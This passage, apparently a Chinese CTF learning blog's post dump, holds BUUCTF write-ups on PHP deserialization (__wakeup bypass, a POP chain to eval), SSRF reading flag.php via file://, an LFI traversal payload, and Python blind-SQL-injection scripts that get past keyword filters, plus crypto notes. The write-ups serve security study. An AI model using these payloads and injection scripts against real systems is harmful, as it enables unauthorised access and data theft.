preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\nget方法里有curl函数，翻翻手册：\n\n> curl_init:初始化新的会话，返回 cURL 句柄，供curl_setopt()、 curl_exec()  \t\t和 curl_close() 函数使用。 \n> curl_setopt:为 cURL 会话句柄设置选项。 \n> curl_exec:执行给定的 cURL 会话。\n> curl_getinfo:获取最后一次传输的相关信息。 \n\ngetBlogContents调用get方法\n还有个waf限制注册时直接读取flag.php\n来看get方法，curl会访问url并返回页面，而getBlogContents则调用get访问blog中的url，因此这里存在SSRF\n\n> SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）\n\n假如我们把url设定成我们想要的地址，就可以访问服务器内部文件。\n结合我们前面得到的序列化，将123.com设定为file协议读取flag.php\n\n```php\n<?php\nclass UserInfo  {\n    public $name = \"test\";\n    public $age = 12;\n    public $blog = \"file:///var/www/html/flag.php\";\n}\n\n$data = new UserInfo();\necho serialize($data);\n//O:8:\"UserInfo\":3:{s:4:\"name\";s:4:\"test\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}\n```\n最后在view.php?no=1后面构造个联合查询\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527130555787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n源码返回base64字符串，解码即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527130650134.png)\n从[这位师傅](https://www.cnblogs.com/kevinbruce656/p/12643338.html)学到了还有个非预期，在view.php?no=*中没有过滤load_file函数，导致可以直接读到flag.php，盲注下/var/www/html/flag.php位置字段即得flag。","tags":["sql","serialize","代码审计"],"categories":["buu刷题"]},{"title":"极客大挑战2019——PHP","url":"/2020/05/26/buu2——[极客大挑战 2019]PHP/","content":"\n平台：buuoj.cn\n打开靶机挨打(卡爆了)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200526131722227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n提示了有备份网站，尝试请求www.zip，成功得到源码。\n解压得如下文件：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200526131932153.png)\n随便点点，flag.php自然是没有flag的，在index.php中只有一段:\n\n```php\n    <?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n包含了class.php文件，get传入一个select参数再将其反序列化。那么考点可能就是php的反序列化漏洞\n来看class.php：\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';//声明两个私有变量\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;//初始化\n    }\n\n    function __wakeup(){//反序列化时调用\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{//满足两个if得到flag\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n?>\n```\n由此我们得知解题的条件：传入一个序列化的字符串，如果字符串经过反序列化之后username=admin，password=100，便会打印出flag。\n那么构造序列化字符串。\n\n```php\n<?php \nclass Name{\n        private $username = 'nonono';\n        private $password = 'yesyes';\n\n        public function __construct($username,$password){\n                $this->username = $username;\n                $this->password = $password; \n        }\n}\n\n$payload = new Name('admin',100);\necho serialize($payload);\n//O:4:\"Name\":2:{s:14:\" Name username\";s:5:\"admin\";s:14:\" Name password\";i:100;}\n```\n到这再看看前面。\n首先是第一个考点：\n\n> 私有化声明，private是私有类型，该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能调用私有类型的属性和方法。\n\n私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀(ASCII 码为 0 的字符(不可见字符))。字符串长度也包括所加前缀的长度。\n也就是说usrname和password前面是有一个\\0的，但是复制的时候会丢失，因此我们需要加上%00填补上去\n\n```php\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n然后我们注意到，在执行__destruct得到flag之前，还会有一个__wakeup函数会在字符串反序列化执行之前把username重新赋值为guest，所以我们需要跳过它。\n这里考察了一个php的漏洞：[php-bugs-72663](https://bugs.php.net/bug.php?id=72663)\n反序列化时，如果反序列化字符串中表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。\n所以这里我们把name属性的个数在字符串中改一下就行\n\n```php\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n将最终的payload传入file得到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200526143553452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n为啥我这么卡？？难道说我的渣渣电脑已经不配打ctf了吗\n","tags":["serialize","代码审计"],"categories":["buu刷题"]},{"title":"PHP中的public、protected、private","url":"/2020/05/26/note13/","content":"\n区别一下public，protected和private\n\n<!-- more -->\n\n### 定义\n\npublic，protected和private称为“访问修饰符”，可以通过在声明前加上这些关键字来定义属性，方法或常量的可见性。\n\npublic：公有类型，可以在任何地方访问。\n\nprotected：受保护类型，只能在类本身内以及继承和父类中访问。\n\nprivate：私有类型，只能由定义该成员的类访问。该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能\t\t\t   调用私有类型的属性和方法\n\n举几个例子。\n\n1.Public\n\n```php\n<?php \nclass pub{\n        public $message = \"你看见了我\";\n        function display(){\n                echo $this->message.\"<br/>\";\n        }\n}\n\n//pub类的子类\nclass child extends pub{\n        function show(){\n                echo $this->message;\n        }\n}\n\n$obj = new child;\necho $obj->message.\"</br>\";\n$obj->display();//类内\n$obj->show();//子类\n    //都可调用\n```\n\n![image-20200526161822746](/images/image-20200526161822746.png)\n\n2.protected\n\n把public改成protected，编译器提示：\n\n![](/images/image-20200526163125793.png)\n\n 通过父类类型的变量,是不允许访问protected成员的。只调用其本身和子类则正常输出。\n\n![image-20200526165538604](/images/image-20200526165538604.png)\n\n3.private\n\n再改为private\n\n![image-20200526165749359](/images/image-20200526165749359.png)\n\n只能由定义该成员的类访问，由于它只对类的内部成员可见，所以要利用它，一般都会是写一个public的方法，再返回这个属性。\n\n```php\n<?php\nclass pri{\n    private $a = 'self';\n    public function test() {\n        $other = new self();\n        $other->a = '这样你才能看见我';\n        var_dump($other->a);\n    }\n}\n\n$obj = new pri();\n$obj->test();\n```\n\n![image-20200526171317806](/images/image-20200526171317806.png)\n\n","categories":["PHP"]},{"title":"HCTF2018——WarmUp","url":"/2020/05/25/buu1——[HCTF 2018]WarmUp/","content":"\n开个坑吧，把buu上的审计题好好做一遍\n平台：buuoj.cn\n##### 1.[HCTF 2018]WarmUp\nbuu上solves最多的一道题。\n开局一张滑稽图，F12查看源码，发现提示：source.php\n查看source.php，源码如下：\n\n```php\n<?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n```\n有个hint.php，打开看下：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200525120724951.png)\n得知flag在ffffllllaaaagggg内，先留着。\n开始分析代码：\n先看这个类：\n\n```php\nclass emmm\n    {\n        public static function checkFile(&$page)//将传入的参数赋给$page\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];//声明白名单$whitelist\n            if (! isset($page) || !is_string($page)) {\n            //判断$page是否不存在或者不是字符串\n                echo \"you can't see it\"；\n                return false;\n            }\n            if (in_array($page, $whitelist)) {\n            //判断$page是否在白名单内\n                return true;\n            }\n\n            $_page = mb_substr(\n            //如果$page里有\"?\"，截取$page中'?'前面部分，若无则截取整个$page\n                $page,\n                0,\n                mb_strpos($page .'?', '?')//mb_strpos()：返回要查找的字符串在另一个字符串中首次出现的位置\n            );\n            if (in_array($_page, $whitelist)) {\n            //判断截取之后的$_page是否在白名单内\n                return true;\n            }\n\n            $_page = urldecode($page);//url解码$page\n            $_page = mb_substr(\n            //再截\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n            //再判断白名单\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n```\n再看第二部分：\n\n```php\n if (! empty($_REQUEST['file'])//file不为空\n        && is_string($_REQUEST['file'])//file是字符串\n        && emmm::checkFile($_REQUEST['file'])//通过emmm类的checkfile检测\n    ) {\n        include $_REQUEST['file'];//包含该文件\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n        //否则滑稽\n    }  \n```\n分析一下，前面已经提示了flag在ffffllllaaaagggg内，再结合第二部分的流程，因此如果我们能让ffffllllaaaagggg通过checkfile的检测，那么我们就可以包含这个文件从而得到flag，所以重点在checkfile上。\n来看checkfile，要通过checkfile就要使返回值为true，也就是最后截断后的_page返回为true，_page经过三次白名单检测，两次\"?\"截断，和一次url解码，一层一层来。\n第一次白名单：source.php或者index.php都行，以source.php为例\n第一次截断加上截断后第二次白名单检测：source.php?，截断后source.php在白名单内检测通过\n利用file包含：source.php?file=(包含文件)\n第二次截断加白名单：source.php?file=source.php?，截断后source.php在白名单内检测通过\n把\"?\"url编码，这里有个隐藏点，PHP中_GET、_POST、_REQUEST这类函数在提取参数值时会URL解码一次，所以我们应当对\"?\"进行两次编码，source.php?file=source.php%253F\n然后把ffffllllaaaagggg写上去，source.php?file=source.php%253F../../../../ffffllllaaaagggg，这里的../我一开始以为是试出来的，后来参考[这位师傅](https://www.cnblogs.com/yesec/p/12635274.html)得知这里是php在解析时将 source.php%253F/ 视作了一个文件夹，因此再加上var/www/html三级目录，自然就是四次../\n因此最后得到payload为\n\n```php\n/source.php?file=source.php%253F/../../../../ffffllllaaaagggg\n```\n得到flag：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200525141630758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n\n不知道为啥这题sloves最多，师傅们戏称的buu劝退题很真实。\n\n复习：\n\n发现了几个没想到的地方\n\n1. 为什么必须要加？而不直接包含flag文件\n\n2. 为什么%253f可以，直接用?也可以\n\n首先是加`？`的原因，这里是我对in_array这个函数没理解清楚，它并不是模糊匹配，它的目标参数必须是完全和数组中的某个元素相同，才能返回true，而我们不加`?`的payload：`/source.php?file=source.php/../../../../ffffllllaaaagggg`，被截取之后是一整个字符串，也就相当于一个元素，肯定是不在$whitelist里的，这样，所有的if都没有返回true，直接读到最后返回false了\n\n然后是%253为什么可以成功包含文件，他经过浏览器第一次读取url之后变成`/source.php?file=source.php%3F/../../../../ffffllllaaaagggg`不是也检测不到`？`吗，那样不就也不能通过in_array吗，是的，第一个确实不能通过，所以**它没有返回值**，注意，它也没返回false，那么函数checkfile依旧是没有退出的，那么他就会继续往下读，从`/source.php?file=source.php%3F/../../../../ffffllllaaaagggg`开始传入浏览器，经过url又一次解码，截断函数就读到了`?`，从而返回了true，而根据判断条件，只要checkfile返回true，就算通过，这里的重点就是并不是说必须要满足每一个if，即使前面的没有满足，只要它没返回false，后面的if再来返回true，那么它整体还是true的。\n\n所以我们知道类似的直接传%3f也是可以的。\n\n而直接用`?`就不难理解了，这就相当于解码没有对他没有意义，第一次截断和第二次截断都是source.php，在白名单内通过都返回true\n\n这样才算是把这道题搞懂了，感谢小白师傅提出的问题，让我重新思考了这道题，还是提醒了我以后做题还是要仔细通透，不能马虎了事。","tags":["代码审计"],"categories":["buu刷题"]},{"title":"PHP反序列化初总结","url":"/2020/05/23/note12/","content":"\n碰到过很多次反序列化的审计，一直都没系统地去看，这两天看了不少博客，自己小小总结一下。\n\n<!-- more -->\n\n### 什么是序列化与反序列化\n\n序列化把一个对象变成可存储，可传输的字符串，并且在转换过程中保存变量的值和数据格式，反序列化把序列化后的字符串还原回对象使用，通过这个过程，可以方便数据的传输和存储，使程序更具维护性。\n\n对于PHP反序列化的过程，我们主要围绕两个函数：serialize()，unserialize()。\n\n那么为什么会产生PHP反序列化漏洞利用呢，这就要讲到PHP中几个特殊函数了。\n\n### 魔术方法\n\n在PHP的语法中，有一些系统自带的方法名，均以双下划线开头，它们会在特定的情况下被调用，即所谓的魔法函数。常见的魔术方法如下：\n\n```php\n__construct：在创建对象时候初始化对象，一般用于对变量赋初值。\n__destruct：\t和构造函数相反，当对象所在函数调用完毕后执行。\n__toString：\t当对象被当做一个字符串使用时调用。\n__sleep:\t 序列化对象之前就调用此方法(其返回需要一个数组)\n__wakeup:\t 反序列化恢复对象之前调用该方法\n__call:\t \t 当调用对象中不存在的方法会自动调用该方法。\n__get:  \t 在调用私有属性的时候会自动执行\n__isset()：\t 在不可访问的属性上调用isset()或empty()触发\n__unset()：\t 在不可访问的属性上使用unset()时触发\n```\n\n<a href=\"https://blog.csdn.net/weixin_42751456/article/details/88758908\">这位师傅</a>的例子可以清晰的看到这些函数被调用的情况:\n\n```php\n<?php\n\nclass test\n{\n    public $variable = 'BUZZ';\n    public $variable2 = 'OTHER';\n    public function printvariable()\n    {\n        echo $this->variable.'<br />';\n    }\n    public function __construct()\n    {\n        echo '__construct'.'<br />';\n    }\n    public function __destruct()\n    {\n        echo '__destruct'.'<br />';\n    }\n    public function __wakeup()\n    {\n        echo '__wakeup'.'<br />';\n    }\n    public function __sleep()\n    {\n        echo '__sleep'.'<br />';\n        return array('variable','variable2');\n    }\n}\n\n//创建一个对象，回调用__construct\n$object = new test();\n//序列化一个对象，会调用__sleep\n$serialized = serialize($object);\n//输出序列化后的字符串\nprint 'Serialized:'.$serialized.'<br />';\n//重建对象，会调用__wakeup\n$object2 = unserialize($serialized);\n//调用printvariable,会输出数据(BUZZ)\n$object2->printvariable();\n//脚本结束，会调用__destruct\n?>\n```\n\n![image-20200523140420068](/images/image-20200523140420068.png)\n\n由此我们可以设想，如果服务器没对我们提交的序列化字符串进行检测，直接将变量放到这些魔术方法中，那么我们是不是可以控制反序列化进程，从而达到代码执行，getshell的目的呢，答案是肯定的。一道<a href=\"https://www.freebuf.com/column/161798.html\">这位师傅</a>的例子。\n\n```php\n<?php\n    class Example{\n        public $handle;\n        function __destruct()\n        {\n            $this->shutdown();\n        }\n        public function shutdown(){\n            $this->handle->close();\n        }\n    }\n    class Process{\n        public $pid;\n        function close(){\n            eval($this->pid);\n        }\n    }\n    if(isset($_GET['data'])){\n        $user_data = unserialize(urldecode($_GET['data']));\n    }\n    ?>\n```\n\n分析下代码，有两个类Example，Process，Example类中有一个__destruct()魔术方法的析构函数(PHP5引入了析构函数的概念，这类似于其它面向对象的语言)，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。Process类中有一个成员函数close()，其中包含eval函数，但其参数不可控。\n\n在PHP审计过程中，应当注意一些危险函数是否外部可控以及有没有进行正确过滤，因此这里我们的重点在eval()，如果我们能够将其参数变为可控，那么我们就可以执行任意代码，$pid的控制通过close()函数，Example类的成员函数shutdown()可以调用close()，所以如果把$handle作为Process的一个类对象，那么就可以通过shutdown()调用Process中的close()进而使得$pid可控。按照从思路构造poc如下：\n\n```php\n<?php\n\nclass Example{\n\tpublic $handle;\n\tfunction __construct(){\n\t\t$this->handle = new process();\n\t}\n}\n\nclass Process{\n\tpublic $pid;\n\tfunction __construct(){\n\t\t$this->pid = 'phpinfo();';\n\t}\n}\n$test = new Example();\n$payload = serialize($test);\necho $payload;\n```\n\n生成payload为：\n\n![image-20200523152607619](/images/image-20200523152607619.png)\n\n当我们序列化的字符串进行反序列化时就会按照我们的设定生成一个Example类对象，当脚本结束时自动调用__destruct()函数，然后调用shutdown()函数，此时$handle为process的类对象，所以接下来会调用process的close()函数，eval()就会执行，而$pid也可以进行设置，此时就造成了代码执行。这里用到了pop链的思想，留个坑。\n\n传入参数getshell：\n\n![image-20200523152752906](/images/image-20200523152752906.png)\n\n### 总结 \n\n- 反序列化不同类型的应用以及pop链的寻找构造还有待学习\n- 该敲代码了","tags":["serialize"],"categories":["PHP"]},{"title":"密码学中一些基本知识","url":"/2020/05/10/note11/","content":"\n在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。\n\n<!-- more -->\n\n### 最基本的求余\n\n(1) (a + b) mod p = (a mod p + b mod p) mod p\n(2) (a -  b) mod p = (a mod p - b mod p) mod p\n(3) (a * b) mod p = (a mod p * b mod p) mod p\n\n### 欧几里得算法\n\n也称辗转相除法，计算两个正整数的最大公约数，当较小整数为0时，则表明上一次相除已除尽，所以上一次相除时的除数（当次输入的gcd函数中的较大数）是最大公约数。计算公式：\n\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tgcd(a,b) = gcd(b,a mod b)\n\na>b且a mod b不为0。\n\npython递归实现：\n\n```python\ndef gcd(a, b):\n    if a < b:\n        a, b = b, a\n    while b != 0:\n        a,b = b,a%b\n    return a\n\na = gcd(6,18)\n\nprint(a)\n\n```\n\n### 乘法逆元\n\n正整数 a, n，如果有 ax = 1(mod n)，则称 x 的最小正整数解为 a 模 n的逆元。也就是说a和x的乘积模n得到的余数为1，\n\n关于它的作用及推导过程：<a href=\"https://blog.csdn.net/weixin_43872728/article/details/99687168\">乘法逆元的作用</a>\n\n### 拓展欧几里得算法\n\n在已知a,b两个正整数和欧几里得求得最大公约数d=gcd(a,b)的基础上，存在整数x,y使得ax+by=d成立，也就是 ax+by=gcd(a，b)，如果a,b都是素数，则ax+by=1成立。\n\npython实现(求逆元)：\n\n```python\ndef myExtGCD(a, b):\n    \"\"\"\n    a: 模的取值\n    b: 想求逆的值\n    \"\"\"\n    if (b == 0):\n        return 1, 0, a\n    x, y, gcd = myExtGCD(b, a % b)\n    return y, x-a//b*y, gcd\n\n\nprint(myExtGCD(717, 73)[1] % 717)\n```\n\n关于逆元的求解，也可直接导入gmpy2库的invert()函数，同样可得到结果，用法：\n\n```python\nfrom gmpy2 import invert()\n\nni = invert(a,b)\n\"\"\"\na为想逆的值\nb为模的取值\n\"\"\"\nprint(ni)\n```\n\n### 费马小定理\n\n当有两数a,p满足gcd(a,p)=1，p是质数时，则有 a^{p-1} = 1 (mod p)\n\n这里可以变形一下，a*a^{p-2} = 1(mod p)\n\n所以a^(p-2)就是a关于p的逆元，再用快速幂即可求得逆元(直接pow())\n\n### 欧拉函数\n\n用希腊字母φ表示,φ(N)表示N的欧拉函数，通俗地理解为小于N且与N互质的数的个数(包含1).\n\n通式：φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)……(1-1/pn)\n\n(1)  p^k型:\n\n若N是质数p(即N=p), φ(n)= φ(p)=p-p^(k-1)=p-1。\n\n若N是质数p的k次幂(即N=p^k)，φ(n)=p^k-p^(k-1)=(p-1)p^(k-1)。\n\n(2)mn型\n\n设n为正整数，以φ(n)表示不超过n且与n互素的正整数的个数，称为n的欧拉函数值。若m,n互质，φ(mn)=(m-1)(n-1)=φ(m)φ(n)。\n\n### 欧拉定理及推论\n\n欧拉定理: 若正整数a，n互质，则a^{φ(n)}≡1 (mod n)，φ(n)为欧拉函数\n\n推论：若n=pq,p≠q都是素数,k是任意整数,则mk(p-1)(q-1)+1 ≡ m mod n\n\n​\t\t   对任意0≤m≤n，只要选择e,d，满足ed=kφ(n)+1，即ed ≡ 1 mod φ(n) ，d ≡ e-1 mod φ(n)\n\n待补充\n\n...","tags":["crypto"],"categories":["密码学"]},{"title":"二分法进行sql盲注","url":"/2020/04/29/note10/","content":"\n在学sql盲注脚本的时候碰到了使用二分法盲注字段的情况，学习一下。\n\n<!-- more -->\n\n#### 环境： [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n复现地址：<a href='https://buuoj.cn/'>BUUCTF</a>\n\n打开题目\n\n![image-20200429185128033](/images/image-20200429185128033.png)\n\n直接告诉了flag在flag表和flag列里，让我们提交id。\n\n这道题过滤了一些字段以及常用注入语句，可以用Burpsuite来fuzz测试一下,如下所示，长度为482的代表被过滤\n\n![image-20200429191528329](/images/image-20200429191528329.png)\n\n最后使用的方法是异或注入，有关异或注入的原理，可参考<a href='https://www.jianshu.com/p/27df5c67157c'>异或注入</a>\n\n直接给出payload：1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))\n\n### 解题\n\n开始编写盲注脚本，这里思路有很多，有枚举法，二分法，还看到过北邮大佬的延时注入，最简单的一种是枚举，直接贴出：\n\n```python\nimport requests\n\nurl = \"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php\"\nwords = \"Hello, glzjin wants a girlfriend.\"\nflag=\"\"\nfor i in range(1,100):\n    print('----------------------------------------------------')\n    for j in range(32,129):#ascii值范围\n        data={\"id\":\"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))\" %(i,j)}\n        re = requests.post(url=url,data=data).text\n        #如果回显为words内容，打印出j转换后的字符\n        if words in re:\n            flag+=chr(j)\n            print(flag)\n            break\n```\n\n大概跑个5分钟,即得flag.\n\n![image-20200429215354204](/images/image-20200429215354204.png)\n\n第二种是这次需要学习的二分法。\n\n关于二分法的知识：\n\n> - 首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。\n>\n> - 如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。\n>\n> - 如果某一步数组为空，则表示找不到目标元素。\n\n也很好理解，对于这题，首先取第一个字符的Ascii值同(32,130)的中间值相比较,如果正好相等，则输出字符，如果Ascii的值大于中间值，则取中间值到最大值这一范围的中间值继续同字符的Ascii值比较，重复上述操作直到两个值相等为止，最终输出整个字符串。按照这个思路编写脚本：\n\n```python\nimport requests\n\nurl = \"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php\"\nresult = \"\"\nfor i in range(1,100):\n\tmin_value = 33\n\tmax_value = 130\n\tmid = (min_value+max_value)//2 #中值\n\twhile(min_value<max_value):\n\t\tpayload ={\"id\" : \"0^\" + \"(ascii(substr((select(flag)from(flag)),{0},1))>{1})\".format(i,mid)}\n\t\thtml = requests.post(url,data=payload)\n\t\tprint(payload)\n\t\tif \"Hello, glzjin wants a girlfriend.\" in html.text:\n            \t#ascii值比mid值大\n\t\t\tmin_value = mid+1   \n\t\telse:\n\t\t\tmax_value = mid\n\t\tmid = (min_value+max_value)//2\n    \t#找不到目标元素时停止\n\tif(chr(mid)==\" \"):\n\t\tbreak\n\tresult += chr(mid)\n\tprint(result)\nprint(\"fina flag:\",result)\n```\n\n同样得到flag，并且速度比枚举法要快的多。\n\n![image-20200429215721640](/images/image-20200429215721640.png)\n\n### 总结\n\n- 拓展了盲注知识\n- 脚本技能又增长了一点点\n\n","tags":["sql"],"categories":["CTF"]},{"title":"安恒四月春季战[not RSA]","url":"/2020/04/26/note9/","content":"\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\n安恒四月赛的一道crypto题，学习写脚本的第n天。\n\n<!-- more -->\n\n下载附件得：\n\n```python\nfrom Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inverse\nfrom secret import flag,p,q\nfrom sympy import isprime,nextprime\nimport random\n\nm=bytes_to_long(flag)\nn=p*q\ng=n+1\nr=random.randint(1,n)\n\nc=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)\n\nprint \"c=%d\"%(c)\nprint \"n=%d\"%(n)\n\n'''\nc=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549\nn=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093\n'''\n```\n\n分析一下。\n\n从 secret 导入flag，p，q的值，flag经bytes_to_long处理转换为长整数传递给m，n为p,q乘积，g的值为n+1，r是由random.randint(1,n)产生的 1 到 n 的一个整数型随机数。\n\n再看c的等式，对于pow()函数，pow(x,y,z)表示x的y次幂除以z的余数，即等价于x**y%z，即c的值经过两个pow函数的乘积再对n的平方取余。\n\n最后是打印出c,n的值，且下方已给出。\n\n题目明确说了不是RSA，看了半天也没看出来这是个什么算法，后来才知道是<a href=\"https://en.wikipedia.org/wiki/Paillier_cryptosystem\">Paillier_cryptosystem</a>，得知加密方式为：\n\n![image-20200426184805920](/images/image-20200426184805920.png)\n\n可以看到c的等式符合，再验证一下r：\n\n```\nimport random\nfrom math import gcd\n\n\nn=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093\n\nr=random.randint(1,n)\nif gcd(r,n)==1:\n    print('right')\n```\n\n![image-20200426185142142](/images/image-20200426185142142.png)\n\n符合加密方式。接下来按照解密方式编写脚本即可：\n\n![image-20200426185319190](/images/image-20200426185319190.png)\n\n嗯。。。这里又看懵了，继续找资料，在wiki上找到：\n\n- L(x)=(x−1)/n\n- 本题p,q的长度相等，λ，μ的值如下：\n\n![image-20200426191435535](/images/image-20200426191435535.png)\n\n好的一步一步来，首先分解n，这里用yafu很快就算出来了(factordb无效，再次吐槽)：\n\n![image-20200426192429587](/images/image-20200426192429587.png)\n\n然后尝试套用公式写脚本，太菜了。。。。写了蛮久，学到了gmpy库的powmod函数用法。\n\n```python\nfrom Crypto.Util.number import long_to_bytes\nfrom gmpy2 import powmod,invert\n\n\np = 80006336965345725157774618059504992841841040207998249416678435780577798937819\nq = 80006336965345725157774618059504992841841040207998249416678435780577798937447\nn=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093\nc=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549\n\nphi = (p-1)*(q-1) \nlamuda = phi #λ\nmo = powmod(c,lamuda,n*n) #快速幂取模方法\nmiu = invert(lamuda,n) \n\ndef L(x):\n    return (x-1)//n \n\nm = L(mo)\nfina = (m*miu)%n\n\nflag = long_to_bytes(fina)\n\nprint(flag)\n\n```\n\n得到flag：\n\n![image-20200426203419593](/images/image-20200426203419593.png)\n\n### 总结\n\n- 了解到了没见过的加密方式\n- 脚本技能增长了一点点","tags":["crypto"],"categories":["CTF"]},{"title":"不含in的注入","url":"/2020/04/16/note8/","content":"\n在buu平台做题时遇见了一种新的注入姿势，记录下来。\n<!-- more -->\n\n##### 题目： [GYCTF2020]Ezsqli\n\n打开题目链接出现一张威武大哥照片，在网页底部找到查询框猜测为注入：\n\n![image-20200416214447439](/images/image-20200416214447439.png)\n\n一番瞎操作无果下fuzz一下，过滤了and,or,join,union select,in,information_schema_tables等关键词，常规注入无法进行\n\n于是很自觉的打开了百度搜wp\n\n学到了新姿势，使用sys.x$schema_flattened_keys代替information_schema进行盲注，参考一波大佬的讲解<a href=\"https://zhuanlan.zhihu.com/p/101759537?from_voters_page=true\">无须in的盲注</a>\n以及<a href=\"https://blog.csdn.net/weixin_43536759/article/details/104847916\">MySQL和MariaDB提取表和列的方法</a>\n\n嫖一波大佬的脚本：\n\n```python\n# -*- coding: UTF-8 -*-\nimport requests\nflag=''\nurl='http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/index.php'\nlink=0\nfor i in range(1,50):\n    for j in range(32,128):\n        payload = \"1 && ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),\"+str(i)+\",1))=\"+str(j)+\"#\"\n        data={\n            'id': payload\n        }\n        res=requests.post(url,data=data)\n        if 'Nu1L' in res.text:\n            flag=flag+chr(j)\n            print(flag)\n            link=1\n            